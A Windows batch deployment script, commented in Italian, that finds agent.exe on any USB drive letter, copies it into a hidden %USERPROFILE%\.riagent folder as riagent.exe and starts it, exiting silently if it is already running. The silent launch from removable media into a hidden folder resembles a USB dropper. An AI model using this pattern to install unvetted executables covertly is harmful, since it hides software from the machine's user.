@echo off
setlocal EnableExtensions

REM ============================================================
REM  deploy.bat
REM  Deploy di riagent.exe in %USERPROFILE%\.riagent\
REM  Se riagent.exe e' gia' in esecuzione: esce in silenzio.
REM ============================================================

REM --- Blocco 0: controllo preliminare ------------------------
REM Se riagent.exe e' in esecuzione, esci silenziosamente.
REM Fallback aggressivo: se il controllo fallisce, prosegui.
tasklist /FI "IMAGENAME eq riagent.exe" /NH 2>nul | find /I "riagent.exe" >nul
if not errorlevel 1 (
    REM processo trovato -> esci silenziosamente
    endlocal
    exit /b 0
)

REM --- Blocco 1: ricerca di agent.exe sulla USB ---------------
for %%d in (d e f g h i j k l m n o p q r s t u v w x y z) do (
    if exist %%d:\agent.exe (
        REM --- Blocco 2: pulizia cartella .riagent ------------
        if exist "%USERPROFILE%\.riagent\agent.exe"   del /F /Q "%USERPROFILE%\.riagent\agent.exe"   >nul 2>&1
        if exist "%USERPROFILE%\.riagent\riagent.exe" del /F /Q "%USERPROFILE%\.riagent\riagent.exe" >nul 2>&1

        REM --- Blocco 3: preparazione cartella ----------------
        if not exist "%USERPROFILE%\.riagent" mkdir "%USERPROFILE%\.riagent"
        attrib +h "%USERPROFILE%\.riagent" >nul

        REM --- Blocco 4: copia e rinomina ---------------------
        copy /Y %%d:\agent.exe "%USERPROFILE%\.riagent\riagent.exe" >nul


        REM --- Blocco 5: avvio --------------------------------
        start "" "%USERPROFILE%\.riagent\riagent.exe"
        goto :done
    )
)

:done
endlocal
exit /b 0